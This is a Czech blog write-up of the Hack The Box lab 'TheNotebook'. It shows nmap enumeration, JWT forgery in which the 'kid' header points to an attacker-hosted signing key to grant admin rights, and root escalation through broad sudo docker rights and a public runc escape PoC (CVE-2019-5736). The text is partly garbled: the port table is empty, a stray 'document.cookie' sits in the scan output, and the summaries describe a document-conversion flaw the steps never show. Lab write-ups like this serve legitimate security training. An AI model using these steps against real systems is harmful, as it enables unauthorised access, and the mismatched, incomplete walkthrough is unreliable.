---
layout: post
author: Tomáš Matějíček
title: "TheNotebook"
date: 2021-01-24
tags: linux ssh sudo php exploit enumeration
---
## Úvod a kontext

TheNotebook stojí na řetězení několika konkrétních slabin a artefaktů: převod dokumentů a server-side render, nginx a SSH.

Důležitější než samotný exploit je tady interpretace mezikroků, protože právě z těchto indicií vzniká stabilní uživatelský přístup a teprve na něj navazuje příliš široká `sudo` oprávnění.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```
```
PORT      STATE    SERVICE VERSION
```

### Detailní analýza služeb

V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
```text
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```
```
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

document.cookie
```

## Získání přístupu

### Přihlášení na cíl (2)

Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
```text
ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
```
```
echo '{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.8:8000/privKey.key"}' |base64
=> __CENSORED__=

echo '{"username":"ttt","email":"ttt@htb.com","admin_cap":true}' |base64
=> __CENSORED__==
```

### Získání user flagu

User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
```bash
cat user.txt
```
```
__CENSORED__
```

## Eskalace oprávnění

### Průzkum možností eskalace

Hledám chybné konfigurace a cesty k vyšším oprávněním.
```bash
sudo -l
```
```
(ALL) NOPASSWD: __CENSORED__ exec -it webapp-dev01*

https://github.com/Frichetten/CVE-2019-5736-PoC

go build main.go
```

### Získání root flagu

Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
```bash
cat root.txt
```
```
__CENSORED__
```

## Shrnutí klíčových poznatků

- První skutečně užitečný závěr plynul z toho, jak do sebe zapadly převod dokumentů a server-side render, nginx a SSH.
- User fáze se opírala o stabilní uživatelský přístup, takže přístup byl reprodukovatelný a ne jen jednorázový.
- Finální kontrolu nad systémem otevřela až mechanika typu příliš široká `sudo` oprávnění.

## Co si odnést do praxe

- První obranná lekce míří na převod dokumentů a server-side render, nginx a SSH. Tokeny, redirecty a validace JWT musí být navržené jako bezpečnostní hranice, ne jen jako aplikační detail; chyba v důvěře k externím klíčům nebo redirectům rychle obchází autorizaci.
- Druhá lekce je o tom, jak rychle se ze zjištění stane stabilní uživatelský přístup. Jakmile se v prostředí objeví použitelný klíč, heslo nebo token, je potřeba předpokládat okamžitý pivot na stabilní shell; obrana proto stojí na segmentaci a oddělení přístupů mezi službami.
- Třetí lekce připomíná riziko, které v praxi představuje příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
